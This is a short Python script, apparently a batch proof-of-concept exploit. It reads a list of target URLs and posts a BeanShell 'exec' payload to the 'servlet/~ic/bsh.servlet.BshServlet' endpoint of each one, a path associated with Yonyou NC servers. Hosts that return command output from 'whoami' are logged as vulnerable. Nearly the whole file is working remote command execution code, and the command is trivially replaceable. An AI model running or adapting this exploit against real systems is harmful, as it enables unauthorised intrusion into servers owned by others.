import requests
import re
from bs4 import BeautifulSoup

vul_url = open("vul_url.txt", "w")


def get_ip():
    f = open("ip.txt", "r")    #ip list for example:http://192.168.1.2:8080/
    lines = f.readlines()
    ip_list = []
    for line in lines:
        line = line.strip()
        #pattern = re.compile(r':[0-9]+')
        #if pattern.search(line):
        #line = line.replace("https", "http")
        ip_list.append(line)
    return ip_list


def poc(ips):
    cmd = "whoami"  # command
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0'
    }
    payload = {
        "bsh.script": 'exec("'+cmd+'")'
    }
    for ip in ips:
        url = ip + "servlet/~ic/bsh.servlet.BshServlet"
        try:
            r = requests.post(url=url, data=payload, headers=headers, timeout=3)
            if "抱歉，您请求的页面出错啦！" in r.text:
                print(url+"    失败")
                pass
            else:
                html = BeautifulSoup(r.content, "html.parser")
                pre = html.find_all("pre")
                if pre[0].text:
                    print(url+"    "+pre[0].text)
                    vul_url.write(url+pre[0].text+"\n")
        except:
            pass


def test():
    print(requests.get("https://www.8684.cn/ip").text)


if __name__ == "__main__":
    ip_ls = get_ip()
    poc(ip_ls)
